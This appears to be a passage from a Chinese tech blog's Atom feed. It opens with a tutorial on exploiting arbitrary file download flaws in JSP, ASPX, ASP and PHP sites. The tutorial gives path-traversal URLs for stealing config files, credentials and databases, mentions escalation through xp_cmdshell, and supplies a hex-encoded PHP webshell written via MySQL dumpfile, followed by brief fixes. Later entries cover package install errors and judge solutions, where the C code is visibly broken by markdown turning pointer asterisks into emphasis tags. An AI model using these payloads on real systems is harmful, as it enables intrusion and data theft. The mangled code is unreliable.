class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.cn/down.jsp?filename=tomcat-users.xml&amp;path=C:/Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure><p>从下载到的tomcat-users.xml文件中可以获得tomcat控制台的登陆账号和密码，从而尝试登陆manager/html，上传一个war文件，就可以获得webshell</p><h5 id="2）下载web-xml"><a href="#2）下载web-xml" class="headerlink" title="2）下载web.xml"></a>2）下载web.xml</h5><p>首先下载网站的配置文件jsp的配置文件放在根目录WEB-INF/Web.xml下（一班都有很多内容，有时含有数据库连接用户名和密码等关键信息）</p><h6 id="url构造如下："><a href="#url构造如下：" class="headerlink" title="url构造如下："></a>url构造如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test/file.do?method=downFile&amp;fileName=../WEB-INF/Web.xml</span><br></pre></td></tr></table></figure><p>获得Web.xml后，我们可以获得数据库连接凭据，Web站点所安装的组建等信息，通过对这些内容的分析，来决定下一步的行动。如尝试连接数据库，寻找安装组件的已知漏洞等。</p></li><li><h4 id="aspx站点"><a href="#aspx站点" class="headerlink" title="aspx站点"></a>aspx站点</h4><h5 id="1）利用sql-server渗透"><a href="#1）利用sql-server渗透" class="headerlink" title="1）利用sql server渗透"></a>1）利用sql server渗透</h5><p>对于aspx站点一般后台都是sql server数据库，因此利用该漏洞的最简单的方法是直接获得数据库密码，直接登录数据库，利用sql server完成渗透。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.org/DownLoadFileLow.aspx?FileName=Accompanying_Persons_Tour_Program.pdf</span><br></pre></td></tr></table></figure><p>首先确定网站根目录下载web.config文件，aspx站点用根目录下的web.config文件保存配置信息。</p><h6 id="尝试确定根目录："><a href="#尝试确定根目录：" class="headerlink" title="尝试确定根目录："></a>尝试确定根目录：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.org/DownLoadFileLow.aspx?FileName=../web.config</span><br><span class="line">http://www.test.org/DownLoadFileLow.aspx?FileName=../../web.config</span><br></pre></td></tr></table></figure><p>打开配置文件找到连接数据库项，尝试连接mysql数据库，sa权限的话直接开启xp_cmdshell，获得systerm权限。非sa权限可以通过差异备份等方式，获得webshell。</p><h5 id="2）-下载dll文件"><a href="#2）-下载dll文件" class="headerlink" title="2） 下载dll文件"></a>2） 下载dll文件</h5><p>首先下载DownLoad.aspx文件，主要是想查看这个aspx站点是否将源代码方法哦dll文件，这样的话就可以直接下载dll获得源代码。</p><h6 id="尝试下载："><a href="#尝试下载：" class="headerlink" title="尝试下载："></a>尝试下载：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx</span><br></pre></td></tr></table></figure><h6 id="在此尝试下载对应的DownLoad-aspx-cs文件"><a href="#在此尝试下载对应的DownLoad-aspx-cs文件" class="headerlink" title="在此尝试下载对应的DownLoad.aspx.cs文件"></a>在此尝试下载对应的DownLoad.aspx.cs文件</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx.cs</span><br></pre></td></tr></table></figure><p>如果失败，说明本站点的源代码放到dll文件中，并且DownLoad.aspx对应的源代码是xkcms.webForm.DownLoad，现在主要猜解一下dll文件名，由这个命令空间xkcms.webForm.DownLoad可以知道DownLoad不是，只能一个个猜。</p><h6 id="猜测url："><a href="#猜测url：" class="headerlink" title="猜测url："></a>猜测url：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/xkcms.dll</span><br><span class="line">http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/wenForm.dll</span><br></pre></td></tr></table></figure><p>猜测成功，dll是被编译过，直接使用.net reflector公积金打开编译后的dll文件，即可获得站点源码，接下来就是源码审计，尝试发现更多可以利用漏洞。</p></li><li><h4 id="asp站点"><a href="#asp站点" class="headerlink" title="asp站点"></a>asp站点</h4><p>一般的asp站点都是access数据库（连接sql server直接可以参考aspx站点的利用方法）。而access数据库可以直接下载，因此利用该漏洞比较简便的方法就是直接下载access数据库，找到管理员密码登陆后台，利用后台的上传功能，上传shell。</p><h6 id="确定站点根目录："><a href="#确定站点根目录：" class="headerlink" title="确定站点根目录："></a>确定站点根目录：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../GraduateSchool/dlsd/download.asp</span><br></pre></td></tr></table></figure><p>下一步，找到网站与数据库操作的动态页面，动态页面中一般使用include包含连接数据库的配置文件。</p><h6 id="找到后台登陆入口："><a href="#找到后台登陆入口：" class="headerlink" title="找到后台登陆入口："></a>找到后台登陆入口：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/jianshen/F89A1/Admin_login.asp</span><br></pre></td></tr></table></figure><h6 id="下载该登陆界面："><a href="#下载该登陆界面：" class="headerlink" title="下载该登陆界面："></a>下载该登陆界面：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/F89A1/Admin_login.asp</span><br></pre></td></tr></table></figure><p>打开下载后文件，可以确定数据库连接文件在inc/conn.asp中.</p><h6 id="再下载该文件"><a href="#再下载该文件" class="headerlink" title="再下载该文件"></a>再下载该文件</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/F89A1/inc/conn.asp</span><br></pre></td></tr></table></figure><p>打开该文件，可以看到数据库路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb</span><br></pre></td></tr></table></figure><p>直接下载失败，应该做了限制，使用下载点下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb</span><br></pre></td></tr></table></figure><p>打开数据库，获得管理员用户名和密码（密码md5加密），破解md5，登陆后台，尝试上传shell</p></li><li><h4 id="php站点"><a href="#php站点" class="headerlink" title="php站点"></a>php站点</h4><p>php一般是mysql数据库，一般mysql数据库禁止远程连接，但是有些站点会使用phpMyAdmin进行管理。</p><h6 id="下载数据库配置文件："><a href="#下载数据库配置文件：" class="headerlink" title="下载数据库配置文件："></a>下载数据库配置文件：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.test.edu.tw/download.php?filename=../conf/config.php&amp;dir=/&amp;title=config.php</span><br></pre></td></tr></table></figure><p>下载获得mysql数据库的用户名和密码是root权限。</p><p>直接使用phpMyAdmin登陆，然后使用mysql导出文件功能导出。</p><p>一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x3C3F706870206576616C28245F504F53545B636D645D293F3E into dumpfile &apos;/home/webadm/public_html/app/test.php&apos;</span><br></pre></td></tr></table></figure></li></ol><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol><li><p>过滤‘.’（点），使用户在url中不能回溯上级目录。</p></li><li><p>正则严格判断用户输入参数的格式。</p></li><li>php.ini配置open_basedir限定文件访问范围。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;任意文件查看与下载漏洞&quot;&gt;&lt;a href=&quot;#任意文件查看与下载漏洞&quot; class=&quot;headerlink&quot; title=&quot;任意文件查看与下载漏洞&quot;&gt;&lt;/a&gt;任意文件查看与下载漏洞&lt;/h2&gt;&lt;h3 id=&quot;漏洞产生原因：&quot;&gt;&lt;a href=&quot;#漏洞产生原因：&quot; class=&quot;headerlink&quot; title=&quot;漏洞产生原因：&quot;&gt;&lt;/a&gt;漏洞产生原因：&lt;/h3&gt;&lt;p&gt;一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件&lt;br&gt;不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。&lt;/p&gt;
&lt;h3 id=&quot;漏洞利用条件：&quot;&gt;&lt;a href=&quot;#漏洞利用条件：&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用条件：&quot;&gt;&lt;/a&gt;漏洞利用条件：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;存在读文件的函数&lt;/li&gt;
&lt;li&gt;读取文件的路径用户可控且未校验或校验不严&lt;/li&gt;
&lt;li&gt;输出了文件内容&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://zhihening.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://zhihening.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python安装mysqlclinent报错及解决</title>
    <link href="http://zhihening.me/2018/10/21/Python%E5%AE%89%E8%A3%85mysqlclinent%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3/"/>
    <id>http://zhihening.me/2018/10/21/Python安装mysqlclinent报错及解决/</id>
    <published>2018-10-21T15:52:59.000Z</published>
    <updated>2018-10-20T16:08:25.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="遇见的问题"><a href="#遇见的问题" class="headerlink" title="遇见的问题"></a>遇见的问题</h2><blockquote><p>学习Django的时候需要使用数据库，在安装的过程中出现报错。</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><blockquote><p>报错：_mysql.c(42) : fatal error C1083: Cannot open include file: ‘config-win.h’: No such file or directory<br><a id="more"></a><br><img src="http://wx2.sinaimg.cn/mw690/006GMOXhgy1fwci4js1q2j30xz0hrn05.jpg" alt="图片"></p></blockquote><h3 id="问题一解决："><a href="#问题一解决：" class="headerlink" title="问题一解决："></a>问题一解决：</h3><blockquote><p>参考我的上一篇文章，<a href="http://hezhing.top/2018/08/28/Scrapy%E7%88%AC%E8%99%AB/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Scrapy%E6%A1%86%E6%9E%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">Windows下安装Scrapy框架遇到的问题</a><br>不过现在不是下载Twisted，而是下载mysqlclient，下载版本依电脑配置而定。安装如下：<img src="http://wx1.sinaimg.cn/mw690/006GMOXhgy1fwf02cjl9ej30xz0hrmz8.jpg" alt="安装"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;遇见的问题&quot;&gt;&lt;a href=&quot;#遇见的问题&quot; class=&quot;headerlink&quot; title=&quot;遇见的问题&quot;&gt;&lt;/a&gt;遇见的问题&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;学习Django的时候需要使用数据库，在安装的过程中出现报错。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;报错：_mysql.c(42) : fatal error C1083: Cannot open include file: ‘config-win.h’: No such file or directory&lt;br&gt;
    
    </summary>
    
      <category term="-解决问题" scheme="http://zhihening.me/categories/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
    
      <category term="-python包安装" scheme="http://zhihening.me/tags/python%E5%8C%85%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04 iso文件下载及虚拟机安装</title>
    <link href="http://zhihening.me/2018/10/15/Ubuntu16-04-iso%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
    <id>http://zhihening.me/2018/10/15/Ubuntu16-04-iso文件下载及虚拟机安装/</id>
    <published>2018-10-15T14:18:03.000Z</published>
    <updated>2018-10-21T08:04:01.421Z</updated>
    
    <content type="html"><![CDATA[<p>#下载<br><a href="http://mirror.pnl.gov/releases/xenial/" target="_blank" rel="noopener">下载地址</a><br><a id="more"></a></p><blockquote><p>点击如下下载32位或者64位iso文件，这里我下载的是64位桌面版的<br><img src="http://wx4.sinaimg.cn/mw690/006GMOXhgy1fw9a11o3jrj31100lxwhb.jpg" alt="图片如下"><br>然后打开VMware Workstation进行安装操作，具体参照下面图片</p></blockquote><blockquote><p>首先新建<img src="http://wx1.sinaimg.cn/mw690/006GMOXhgy1fwacdrl1gzj30be09ujrz.jpg" alt="新建"><br>然后典型，下一步。<br><img src="http://wx4.sinaimg.cn/mw690/006GMOXhgy1fwacdr5zcaj30fu0f6wfn.jpg" alt="下一步"><br>选择下载的iso文件.<br><img src="http://wx4.sinaimg.cn/mw690/006GMOXhgy1fwacds13o2j30fu0f6js0.jpg" alt="选择文件"><br>后面按部就班操作就行。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#下载&lt;br&gt;&lt;a href=&quot;http://mirror.pnl.gov/releases/xenial/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="软件安装" scheme="http://zhihening.me/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>Windows下安装Scrapy框架遇到的问题</title>
    <link href="http://zhihening.me/2018/08/28/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Scrapy%E6%A1%86%E6%9E%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://zhihening.me/2018/08/28/Windows下安装Scrapy框架遇到的问题/</id>
    <published>2018-08-28T14:53:39.000Z</published>
    <updated>2018-10-20T16:04:22.512Z</updated>
    
    <content type="html"><![CDATA[<p>##遇见如下错误：</p><blockquote><p>error: Microsoft Visual C++ 14.0 is required. Get it with “Microsoft Visual C++ Build Tools”</p></blockquote><a id="more"></a><p>##解决办法如下：</p><blockquote><p>一般按照提示是需要安装一个C++14.0的一个库，但是进入网址后，此库总的有4G这么大，下载安装肯定不现实，好在在<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted" target="_blank" rel="noopener">这里</a>有文件，可以先行下载。不过是个国外网站，需要科学上网，不过现在貌似进的挺快的。下载的文件为这个：<img src="https://wx4.sinaimg.cn/mw690/006GMOXhgy1fuptq2uisoj30fk0aaaat.jpg" alt="下载"></p></blockquote><blockquote><p>然后执行操作为：<img src="https://wx3.sinaimg.cn/mw690/006GMOXhgy1fuptq35qqvj30qa031748.jpg" alt="执行代码"><br>然后再次执行操作：pip install Scrapy</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;##遇见如下错误：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;error: Microsoft Visual C++ 14.0 is required. Get it with “Microsoft Visual C++ Build Tools”&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="-解决问题" scheme="http://zhihening.me/categories/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
    
      <category term="-问题" scheme="http://zhihening.me/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>swust oj数据结构前40题中的20个python实现</title>
    <link href="http://zhihening.me/2018/08/02/swust-oj%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%89%8D40%E9%A2%98%E4%B8%AD%E7%9A%8420%E4%B8%AApython%E5%AE%9E%E7%8E%B0/"/>
    <id>http://zhihening.me/2018/08/02/swust-oj数据结构前40题中的20个python实现/</id>
    <published>2018-08-02T12:52:32.000Z</published>
    <updated>2018-10-14T13:59:51.992Z</updated>
    
    <content type="html"><![CDATA[<p>#注意：学校oj python所用的是python2，用python3交会报CE 不要问我怎么知道的，当你有满屏CE的时候，你会知道的。</p><h1 id="941-有序顺序表的合并操作的实现"><a href="#941-有序顺序表的合并操作的实现" class="headerlink" title="[941] 有序顺序表的合并操作的实现"></a>[941] 有序顺序表的合并操作的实现</h1><div class="tabs" id="941"><ul class="nav-tabs"><li class="tab active"><a href="#941-1">思路</a></li><li class="tab"><a href="#941-2">题目描述</a></li><li class="tab"><a href="#941-3">python代码实现</a></li><li class="tab"><a href="#941-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="941-1"><div class="note default"><blockquote><br><p>比较a列表和b列表的大小，然后按顺序放到 c列表里</p><br></blockquote></div></div><div class="tab-pane" id="941-2"><p><a href="http://acm.swust.edu.cn/#/problems/941/341?_k=ve00av" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>已知两非递减的顺序线性表，要求合并成一个新的非递减顺序线性表。(测试数据为整型)</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>输入包含四行，第一行为自然数n，表示第一个非递减顺序线性表的长度;<br>第二行为n个自然数构成的非递减顺序线性表;<br>第三行为自然数m，表示第二个非递减顺序线性表的长度;<br>第四行为m个自然数构成的非递减顺序线性表</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>用一行输出合并后的非递减顺序线性表，各数之间用一个空格隔开。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="941-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line">n1 = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line">n2 = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line">len_a = len(a)</span><br><span class="line">len_b = len(b)</span><br><span class="line"></span><br><span class="line">la, lb = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">c = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> la &lt; len_a <span class="keyword">and</span> lb &lt; len_b:</span><br><span class="line">    <span class="keyword">if</span> a[la] &lt; b[lb]:</span><br><span class="line">        c.append(a[la])</span><br><span class="line">        la += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c.append(b[lb])</span><br><span class="line">        lb += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> la &lt; len_a:</span><br><span class="line">    c.append(a[la])</span><br><span class="line">    la += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> lb &lt; len_b:</span><br><span class="line">    c.append(b[lb])</span><br><span class="line">    lb += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(la + lb):</span><br><span class="line">    print c[i],</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="941-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    elemtype data[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;L,elemtype a[],<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[i]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(sqlist L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“%d”</span>,L-&gt;data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt; L-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“ %d”</span>,L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“\n”</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Combine</span><span class="params">(sqlist <em>&amp;la,sqlist </em>&amp;lb,sqlist <em>&amp;lc)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;la-&gt;length&amp;&amp;j&lt;lb-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(la-&gt;data[i]&lt;=lb-&gt;data[j])</span><br><span class="line">        &#123;</span><br><span class="line">            lc-&gt;data[k]=la-&gt;data[i];</span><br><span class="line">            k++;i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            lc-&gt;data[k]=lb-&gt;data[j];</span><br><span class="line">            k++;j++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;la-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        lc-&gt;data[k]=la-&gt;data[i];</span><br><span class="line">        k++;i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(j&lt;lb-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        lc-&gt;data[k]=lb-&gt;data[j];</span><br><span class="line">        k++;j++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    lc-&gt;length=k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la;</span><br><span class="line">    sqlist <em>lb;</em></span><br><span class="line">    sqlist lc;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1000</span>],b[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a[i]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;b[j]);</span><br><span class="line">    </span><br><span class="line">    initlist(la);</span><br><span class="line">    initlist(lb);</span><br><span class="line">    initlist(lc);</span><br><span class="line">    </span><br><span class="line">    creatlist(la,a,n);</span><br><span class="line">    creatlist(lb,b,m);</span><br><span class="line">    </span><br><span class="line">    Combine(la,lb,lc);</span><br><span class="line">    </span><br><span class="line">    desplist(lc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><a id="more"></a><h1 id="942-逆置顺序表"><a href="#942-逆置顺序表" class="headerlink" title="[942] 逆置顺序表"></a>[942] 逆置顺序表</h1><div class="tabs" id="942"><ul class="nav-tabs"><li class="tab active"><a href="#942-1">思路</a></li><li class="tab"><a href="#942-2">题目描述</a></li><li class="tab"><a href="#942-3">python代码实现</a></li><li class="tab"><a href="#942-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="942-1"><div class="note default"><p>…</p></div></div><div class="tab-pane" id="942-2"><p><a href="http://acm.swust.edu.cn/#/problems/942/-1?_k=9boy04" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" 